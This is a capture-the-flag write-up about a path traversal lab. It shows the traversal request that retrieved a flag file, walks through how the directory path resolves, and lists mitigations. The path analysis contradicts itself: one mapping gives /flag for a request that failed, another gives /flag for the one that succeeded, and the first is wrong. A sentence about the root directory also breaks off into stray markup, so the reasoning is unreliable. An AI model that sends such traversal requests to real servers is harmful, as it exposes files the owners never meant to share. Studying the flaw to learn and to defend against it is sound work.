# Path Traversal Challenge Solution and Analysis

## Challenge Summary

The challenge is a web security lab designed to test for **Path Traversal vulnerabilities**. The web server exposes access to files through a route such as:

```
/shared/<user_input>
```

Internally, the server maps this to a filesystem path like:

```
/challenge/files/<user_input>
```

For example:

```
/shared/fortunes/fortune-1.txt
→ /challenge/files/fortunes/fortune-1.txt
```

## Goal

Retrieve a file named `flag` which is not listed in the `files` or `files/fortunes` directory. All attempts to access `/shared/fortunes/flag`, `/shared/flag`, etc., result in `404 Not Found`.

## Observations from Server Logs

1. Requests such as:

   * `/shared/../flag`
   * `/shared/fortunes/../../flag`
   * `/shared/x/../../flag`

   all map to:

   * `/challenge/files/../flag` → `/challenge/flag`
   * `/challenge/files/fortunes/../../flag` → `/flag`

   All of these attempts resulted in 404 errors.

2. The successful request was:

   ```
   GET /shared/fortunes/../../../flag
   ```

   → Internally resolved to:

   ```
   /challenge/files/fortunes/../../../flag
   → /challenge/files → /challenge → / → /flag
   ```

### Why Did This Work?

* `../../../` performs 3 directory traversals:

  * 1st `..` → `/challenge/files`
  * 2nd `..` → `/challenge`
  * 3rd `..` → `/`

* Therefore, the path becomes `/flag`.

* This means the flag file is placed in the \*\*root directory of the system \*\*\`\`, which is a common trick in security challenges.

## Final Exploit Path

```http
GET /shared/fortunes/../../../flag HTTP/1.1
```

### Server Maps to:

```
/challenge/files/fortunes/../../../flag
→ /flag
```

## Conclusion

The path traversal vulnerability allowed escaping the intended directory (`/challenge/files`) entirely and accessing system-level paths. By sending `../../../flag`, the attacker reaches the root and reads the flag file.

## Mitigation Strategies

To prevent this type of vulnerability:

* **Normalize and validate input paths**: After resolving symbolic links and path traversal sequences, confirm the resulting path is within the allowed directory.
* **Use sandboxing**: Use chroot jails or containers to restrict filesystem access.
* **Avoid direct user-controlled path concatenation**: Sanitize and validate inputs before appending them to any filesystem path.
